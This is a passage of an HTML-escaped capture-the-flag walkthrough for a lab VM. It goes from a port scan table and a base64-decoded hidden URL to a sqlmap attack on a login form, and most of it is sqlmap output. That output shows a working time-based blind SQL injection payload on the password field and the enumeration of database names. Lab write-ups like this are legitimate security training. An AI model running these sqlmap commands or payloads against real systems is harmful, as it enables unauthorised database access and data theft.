      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 6.6.1p1 Ubuntu&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 1337&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache/2.4.7 (Ubuntu)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;###HTTP Enumeration&lt;/p&gt;

&lt;p&gt;Viewing any 404 page rendered:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/lotr/base64-src.png&quot; alt=&quot;base64 image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inspection of the page source revealed a base64 encoded string, encoded within
another string:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Lzk3ODM0NTIxMC9pbmRleC5waHA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Closer!#
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Lzk3ODM0NTIxMC9pbmRleC5waHA=&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
/978345210/index.php#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above URL exposed a web form, vulnerable to SQL injection.&lt;/p&gt;

&lt;h2 id=&quot;sqlmap&quot;&gt;SQLMAP&lt;/h2&gt;

&lt;p&gt;Thw following SQLMap commands were leveraged during the SQL enumeration and SQL
injection database dumping.&lt;/p&gt;

&lt;h3 id=&quot;sqlmap-enumerate-databases&quot;&gt;SQLMap Enumerate Databases&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# sqlmap -o -u http://192.168.30.140:1337/978345210/index.php --forms --dbs&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;sqlmap-full-command&quot;&gt;SQLMap Full Command&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;         _
___ ___| |_____ ___ ___  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1.0-dev-nongit-20150826&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
|_ -| &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; | |     | .&lt;span class=&quot;s1&quot;&gt;'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets
without prior mutual consent is illegal. It is the end user'&lt;/span&gt;s
responsibility to obey all applicable &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;, state and federal
laws. Developers assume no liability and are not responsible
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;any misuse or damage caused by this program

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; starting at 13:38:08

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] heuristics detected web page charset &lt;span class=&quot;s1&quot;&gt;'ascii'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:08] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;forms
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#1] form:&lt;/span&gt;
POST http://192.168.30.140:1337/978345210/index.php
POST data: &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;submit&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%20Login%20
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;this form? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n/q] 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Y

&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to fill blank fields with random values? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] using
&lt;span class=&quot;s1&quot;&gt;'/root/.sqlmap/output/results-11232015_0138pm.csv'&lt;/span&gt; as the CSV
results file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;multiple targets mode
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] heuristics detected web page charset &lt;span class=&quot;s1&quot;&gt;'ascii'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target URL is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL is stable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;POST parameter &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; is
dynamic
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] POST parameter &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; does not appear
dynamic
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] heuristic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;shows that POST
parameter &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; might not be injectable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SQL injection on POST parameter
&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'AND boolean-based blind - WHERE or
HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 boolean-based blind -
Parameter replace'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 AND error-based -
WHERE, HAVING, ORDER BY or GROUP BY clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL AND error-based - WHERE
or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase AND
error-based - WHERE or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Oracle AND error-based - WHERE or
HAVING clause (XMLType)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 error-based - Parameter
replace'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL inline queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL inline queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase inline
queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries
(SELECT - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:21] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL &amp;gt; 8.1 stacked queries
(comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase stacked
queries (comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Oracle stacked queries
(DBMS_PIPE.RECEIVE_MESSAGE - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0.12 AND time-based blind
(SELECT)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:22] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL &amp;gt; 8.1 AND time-based
blind'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase
time-based blind'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Oracle AND time-based blind'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Generic UNION query (NULL) - 1 to 10
columns'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] using unescaped version of the &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;because of zero knowledge of the back-end DBMS. You can try to
explicitly &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;it using option &lt;span class=&quot;s1&quot;&gt;'--dbms'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:26] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL UNION query (NULL) - 1 to 10
columns'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:29] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] POST parameter &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; is not
injectable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:29] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;POST parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; is
dynamic
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:29] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] POST parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; does not appear
dynamic
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] heuristic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;shows that POST
parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; might not be injectable
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SQL injection on POST parameter
&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'AND boolean-based blind - WHERE or
HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 boolean-based blind -
Parameter replace'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 AND error-based -
WHERE, HAVING, ORDER BY or GROUP BY clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:30] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL AND error-based - WHERE
or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase AND
error-based - WHERE or HAVING clause'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Oracle AND error-based - WHERE or
HAVING clause (XMLType)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0 error-based - Parameter
replace'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL inline queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL inline queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase inline
queries'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt; 5.0.11 stacked queries
(SELECT - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:32] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'PostgreSQL &amp;gt; 8.1 stacked queries
(comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:32] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Microsoft SQL Server/Sybase stacked
queries (comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:32] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Oracle stacked queries
(DBMS_PIPE.RECEIVE_MESSAGE - comment)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:32] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'MySQL &amp;gt;= 5.0.12 AND time-based blind
(SELECT)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:38:42] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] POST parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; seems to be &lt;span class=&quot;s1&quot;&gt;'MySQL
&amp;gt;= 5.0.12 AND time-based blind (SELECT)'&lt;/span&gt; injectable 
it looks like the back-end DBMS is &lt;span class=&quot;s1&quot;&gt;'MySQL'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to skip
&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;payloads specific &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;other DBMSes? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the remaining tests, &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to include all tests &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'MySQL'&lt;/span&gt; extending provided level &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and risk &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; values? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n]
Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:39:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;'Generic UNION query (NULL) - 1 to 20
columns'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:39:31] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] automatically extending ranges &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UNION
query injection technique tests as there is at least one other
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;potential&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; technique found
sqlmap got a 302 redirect to
&lt;span class=&quot;s1&quot;&gt;'http://192.168.30.140:1337/978345210/profile.php'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want
to follow? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] n
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:39:35] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL appears to be UNION injectable
with 2 columns
injection not exploitable with NULL values. Do you want to try
with a random integer value &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;option &lt;span class=&quot;s1&quot;&gt;'--union-char'&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:39:43] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;UNION based SQL injection is not
detected, please consider forcing the back-end DBMS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g.
&lt;span class=&quot;s1&quot;&gt;'--dbms=mysql'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:39:43] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the injection point on POST
parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; is a &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positive

POST parameter &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; is vulnerable. Do you want to keep
testing the others &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N] 
sqlmap identified the following injection point&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with a total
of 336 HTTP&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; requests:
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
Parameter: password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;POST&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    Type: AND/OR time-based blind
        Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            Payload: &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WWXY&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' AND (SELECT *
            FROM (SELECT(SLEEP(5)))PWKv) AND
            '&lt;/span&gt;eVRP&lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt;eVRP&amp;amp;submit&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Login 
            &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to exploit this SQL injection? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is MySQL
            web server operating system: Linux Ubuntu
            web application technology: Apache 2.4.7, PHP 5.5.9
            back-end DBMS: MySQL 5.0.12
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching database names
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] fetching number of databases
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] retrieved: 
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:23] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] it is very important not to
            stress the network adapter during usage of
            time-based payloads to prevent potential errors 
            &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want sqlmap to try to optimize value&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for
            &lt;/span&gt;DBMS delay responses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;option &lt;span class=&quot;s1&quot;&gt;'--time-sec'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
            4
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:40:54] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] retrieved: 
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:41:04] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] adjusting &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;delay to 2 seconds
            due to good response &lt;span class=&quot;nb&quot;&gt;times
            &lt;/span&gt;information_schema
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:43:25] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] retrieved: Webapp
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:44:15] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] retrieved: mysql
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:44:56] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] retrieved: performance_schema
            available databases &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4]:
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; information_schema
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; mysql
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; performance_schema
            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Webapp

            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;13:47:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] you can find results of scanning
            &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;multiple targets mode inside the CSV file
            &lt;span class=&quot;s1&quot;&gt;'/root/.sqlmap/output/results-11232015_0138pm.csv&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;sqlmap-database-dump&quot;&gt;SQLMap Database Dump&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;available databases &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4]:
